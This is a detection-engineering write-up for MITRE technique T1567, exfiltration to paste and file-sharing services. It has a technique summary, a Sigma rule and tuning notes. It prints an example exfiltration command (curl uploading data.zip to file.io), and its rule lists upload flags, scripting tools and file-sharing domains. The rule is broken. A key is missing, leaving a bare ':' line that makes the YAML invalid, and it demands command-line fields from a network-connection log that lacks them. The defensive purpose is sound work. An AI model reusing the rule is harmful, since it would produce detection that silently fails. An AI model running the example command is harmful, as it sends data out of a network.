### 1. Technique Breakdown: T1567

* What it is: Exfiltration Over Web Service. Adversaries exfiltrate stolen data by posting it to public web services (such as pastebins, temporary file-sharing portals, or API endpoints of online utilities) rather than standard cloud storage. They configure scripting engines (like PowerShell) or file-transfer binaries (like `curl.exe`) to execute HTTP POST requests targeting these services. Since these web services are legitimate, their outbound traffic is often allowed through corporate firewalls.
* Log Source Requirements: Sysmon Network Connection logs (Event ID 3) and Process Creation logs (Event ID 1) capturing web request parameters.
* Coverage Check:
    * HIDS (Sysmon + Wazuh): YES. Sysmon Event ID 3 logs the destination hostname of network sockets initiated by scripting utilities. Event ID 1 captures command line details (e.g. `curl -F "file=@data.zip" https://file.io`).
    * NIDS (Suricata + Zeek): YES. Network monitoring records SSL SNI negotiations or HTTP requests to public paste/file sharing domains.

### 2. Custom Sigma Rule

This rule utilizes Sysmon Event ID 3 (Network Connection) and Event ID 1 (Process Creation) to detect scripting engines or command-line utilities (like PowerShell, cmd, curl) initiating connections or executing commands targeting known public file-sharing and pastebin web services.

```yaml
title: Exfiltration - Data Upload to Public Web Service (AN1511)
id: 4dc4c888-7aee-4709-b9a5-25988a1721c2
status: experimental
description: Detects command-line interpreters or file transfer tools initiating network connections or sending HTTP requests to known pastebin or temporary file-sharing web services, which may indicate data exfiltration.
author: Krishna Gupta
date: 2026-06-08
logsource:
    category: network_connection
    product: windows
    # Relies on Sysmon Event ID 3/Event ID 1
detection:
    selection_process:
        Image|endswith:
            - '\powershell.exe'
            - '\pwsh.exe'
            - '\cmd.exe'
            - '\curl.exe'
            - '\wscript.exe'
            - '\cscript.exe'
    selection_domains:
        DestinationHostname|contains:
            - 'pastebin.com'
            - 'paste.ee'
            - 'hastebin.com'
            - 'file.io'
            - 'gofile.io'
            - 'sendspace.com'
            - 'anonfiles.com'
            - 'transfer.sh'
            - 'mega.nz'
            - 'temp.sh'
        CommandLine|contains:
            - 'pastebin'
            - 'file.io'
            - 'gofile'
            - 'transfer.sh'
            - ' -F ' # curl form-data upload flag
            - ' -d ' # curl post data flag
            - 'UploadFile'
            - 'PostAsync'
    condition: selection_process and selection_domains
fields:
    - Image
    - CommandLine
    - User
    - LogonId
    - Initiated
    - SourceIp
    - DestinationIp
    - DestinationPort
:
    - Developers using curl or PowerShell to share debugging logs or build outputs on public paste bins.
    - Automated system status monitoring scripts configured to post status details to external developer dashboards.
level: high
tags:
    - attack.exfiltration
    - attack.t1567
    - analytic.an1511
    - detection.det0548
```

### 3. Blind Spots & Tuning (The "Problems")

* Problem 1: Dynamic Client IP Range
  * The Issue: Legitimate client processes communicating with external SaaS platforms can generate massive outbound log volumes.
  * The Fix: Baseline client egress destinations, restricting alerts to network connections initiated by execution shells or scripting hosts.

* Problem 2: Encrypted Payload Blind Spots
  * The Issue: Standard port monitoring cannot inspect encrypted TLS/HTTPS payload contents, leaving C2 beaconing undetected.
  * The Fix: Analyze TLS handshake metadata (specifically SNI domain names) and calculate connection frequency or beaconing heuristics.

* Problem 3: Proxy and Gateway Redirection
  * The Issue: Outbound connections routed through internal proxy servers will report the proxy IP as destination, masking the target C2 server.
  * The Fix: Correlate client endpoint process logs with proxy server access logs to resolve the true external destination IP.
